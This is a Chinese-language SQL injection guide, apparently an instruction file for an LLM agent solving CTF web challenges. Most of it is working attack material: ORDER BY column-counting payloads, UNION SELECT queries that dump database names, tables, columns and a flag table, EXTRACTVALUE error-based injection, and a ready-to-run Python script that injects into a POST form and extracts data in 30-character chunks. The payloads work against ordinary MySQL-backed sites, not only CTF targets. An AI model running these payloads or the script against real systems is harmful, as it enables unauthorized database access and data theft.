# UNION 注入与报错注入深度指南

## UNION 列数精确判断（ORDER BY 二分法 — 必须完成！）

**用 ORDER BY 二分法精确确定列数。必须找到确切的 N，使 ORDER BY N 成功且 ORDER BY N+1 失败：**
```
' ORDER BY 1--    → 正常
' ORDER BY 10--   → 错误  → 列数在 1-9 之间
' ORDER BY 5--    → 正常  → 列数在 5-9 之间
' ORDER BY 8--    → 正常  → 列数在 8-9 之间
' ORDER BY 9--    → 正常  → 列数在 9-9 之间
' ORDER BY 10--   → 错误  → 列数 = 9（确认！）
```

**⚠️ 关键规则：ORDER BY N 成功 ≠ 列数就是 N！**
- ORDER BY 5 成功只说明列数 ≥ 5，可能是 5, 6, 7, 8, 9...
- **必须继续测试直到找到 ORDER BY N+1 失败的边界**
- 找到确切列数后才能构造 UNION

**构造 UNION：**`' UNION SELECT 1,2,3,4,5,6,7,8,9-- `（用确切列数）

**如果 UNION 报错：**
- 不要立刻放弃！先检查列数是否正确
- 如果 ORDER BY N 成功但 UNION SELECT 1,...,N 报错，尝试 N+1、N+2（ORDER BY 对部分查询可能不准）
- 尝试不同注释符：`--`、`#`、`-- -`
- 尝试 NULL 代替数字：`UNION SELECT NULL,NULL,...`
- **必须尝试到 ORDER BY 上界之前不要放弃 UNION**

**找回显位**：观察页面上哪个数字显示了（如显示 2 和 3），这些位置可以放查询语句。

## UNION SELECT 手工提取（首选方案！）

**UNION SELECT 没有字符数限制，应当作为第一选择！仅在 UNION 确实不可用时才用 EXTRACTVALUE。**

```sql
-- 数据库名 + 用户（将查询放在回显位，如位置 2）
' UNION SELECT 1,database(),user(),4,5,6,7,8,9--

-- 所有表名
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9 FROM information_schema.tables WHERE table_schema=database()--

-- 指定表的列名
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9 FROM information_schema.columns WHERE table_name='flag'--

-- 提取数据（完整 flag，无截断！）
' UNION SELECT 1,flag,3,4,5,6,7,8,9 FROM flag--
```

### CTF 常见 flag 表名速查

枚举表名后，优先检查以下常见命名：
- `flag`, `flags`, `secret`, `secrets`
- `admin`, `users`, `ctf`, `challenge`
- `fl4g`, `s3cret`, `key`, `config`

**为什么 UNION 优先？**
- 返回完整数据，无 32 字符截断
- 一次查询拿到完整 flag
- 不需要 SUBSTRING 分段 + 手动拼接（拼接容易丢字符）

## 报错注入截断陷阱（EXTRACTVALUE / UPDATEXML — 仅当 UNION 不可用时使用！）

**再次强调：UNION SELECT 是首选。EXTRACTVALUE 容易丢字符，仅在 UNION 确实失败后使用。**

EXTRACTVALUE() 和 UPDATEXML() 输出上限 32 字符。`CONCAT(0x7e, data)` 中 `~` 占 1 字符，有效数据只有 31 字符。

**⚠️ 绝对不要手动拼接 EXTRACTVALUE 分段！LLM 数hex字符极易出错。必须用 Python 脚本自动提取+拼接+验证：**

```python
# 用 bash 运行此 Python 脚本自动提取完整 flag
# 只需修改 URL、POST参数、注入点位置
import requests, re, sys

URL = "http://TARGET/send.php"  # ← 修改目标URL
# ← 修改POST参数，注入点用 {PAYLOAD} 占位
def make_data(payload):
    return {
        'fullname': f"1' AND {payload}-- ",  # ← 注入参数
        'email': 'a@b.com', 'phone': '1',
        'subject': 't', 'message': 't', 'submit': '1'
    }

def extract(payload):
    r = requests.post(URL, data=make_data(payload))
    m = re.search(r"XPATH syntax error: '~([^']*)'", r.text)
    return m.group(1) if m else None

# 1) 获取长度
total_len = int(extract("EXTRACTVALUE(1,CONCAT(0x7e,LENGTH((SELECT flag FROM flag))))"))
print(f"Flag length: {total_len}")

# 2) 分段提取 (每段30字符，安全不超32限制)
CHUNK = 30
flag = ""
for start in range(1, total_len + 1, CHUNK):
    part = extract(f"EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT flag FROM flag),{start},{CHUNK})))")
    if not part:
        print(f"ERROR: Segment at {start} returned None!")
        sys.exit(1)
    print(f"  Segment [{start}:{start+len(part)-1}] = '{part}' (len={len(part)})")
    flag += part

# 3) 验证
print(f"\nAssembled flag ({len(flag)} chars): {flag}")
if len(flag) != total_len:
    print(f"ERROR: Length mismatch! Expected {total_len}, got {len(flag)}")
    sys.exit(1)
if not flag.endswith('}'):
    print("ERROR: Flag doesn't end with }")
    sys.exit(1)
print(f"VERIFIED OK: {flag}")
```

**使用方式**：复制上面的 Python 脚本，修改 URL 和参数后直接执行。Python 会自动分段、拼接、验证长度。绝不手动拼接！
